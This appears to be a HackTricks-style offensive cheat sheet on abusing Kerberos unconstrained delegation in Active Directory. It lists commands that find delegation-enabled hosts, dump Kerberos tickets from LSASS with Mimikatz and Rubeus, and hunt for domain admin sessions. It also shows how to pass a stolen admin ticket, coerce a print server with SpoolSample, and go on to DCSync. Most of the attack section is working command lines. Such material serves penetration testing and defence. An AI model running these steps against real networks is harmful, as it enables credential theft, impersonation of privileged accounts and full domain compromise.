# Unconstrained Delegation

Discover domain computers which have unconstrained delegation\
enabled using PowerView:

```powershell
Get-NetComputer -UnConstrained
```

Using ActiveDirectory module:

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

ADSearch

```
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

Export tickets with Mimikatz Access LSASS memory

```powershell
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way
```

Monitor logins and export new tickets

Doens't access LSASS memory directly, but uses Windows APIs

```powershell
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

We must trick or wait for a domain admin to connect a service. Now, if the command is run again:

```powershell
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

```powershell
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```

The DA token could be reused:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgtDOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

## [**Force Authentication**](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html?highlight=Uncons#force-authentication)

If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.

To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

bash

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

If the TGT if from a domain controller, you could perform a [**DCSync attack**](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)